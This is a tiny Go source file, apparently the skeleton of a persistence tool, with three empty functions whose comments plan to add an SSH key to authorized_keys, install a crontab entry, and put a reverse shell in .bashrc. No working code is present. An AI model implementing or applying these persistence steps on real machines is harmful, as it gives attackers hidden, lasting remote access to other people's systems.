package utils

func SSHKey() {
	// Check if ssh is installed
	// Add Public Key to autorized_keys
}

func Crontab() {
	// If we have permissions add a crontab
}

func Bashrc() {
	// Add reverse shell to .bashrc file
}
